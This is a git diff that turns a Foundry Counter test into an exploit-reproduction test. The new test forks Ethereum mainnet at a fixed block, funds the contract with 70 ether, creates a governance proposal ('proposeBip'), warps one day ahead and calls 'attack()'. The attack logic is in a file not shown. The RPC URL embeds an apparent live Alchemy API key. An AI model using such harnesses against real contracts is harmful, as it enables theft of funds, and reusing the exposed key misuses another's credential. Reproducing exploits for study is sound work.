@@ -1,24 +1,23 @@
-// SPDX-License-Identifier: UNLICENSED
 pragma solidity ^0.8.13;
-
-import "forge-std/Test.sol";
-import "../src/Counter.sol";
-
-contract CounterTest is Test {
-    Counter public counter;
-
-    function setUp() public {
-        counter = new Counter();
-        counter.setNumber(0);
-    }
-
-    function testIncrement() public {
-        counter.increment();
-        assertEq(counter.number(), 1);
-    }
-
-    function testSetNumber(uint256 x) public {
-        counter.setNumber(x);
-        assertEq(counter.number(), x);
-    }
+ 
+import "../lib/forge-std/src/Test.sol";
+import "../src/Attacker.sol";
+ 
+contract AttackerTest is Test {
+   function setUp() public {
+       vm.createSelectFork('https://eth-mainnet.g.alchemy.com/v2/O_YrXfmF-lYprk8_b4UKRj7dkQLENxbQ', 14595905);
+       vm.deal(address(this), 70 ether);
+   }
+ 
+   function testAttack() public {
+       Attacker attacker = new Attacker();
+ 
+       attacker.proposeBip{value: 70 ether}();
+ 
+       console.log("Proposal created, warping, %", block.timestamp);
+       vm.warp(block.timestamp + 1 days);  // travelling 1 day in the future
+       console.log("Warped, %s", block.timestamp);
+      
+       attacker.attack();
+   }
 }
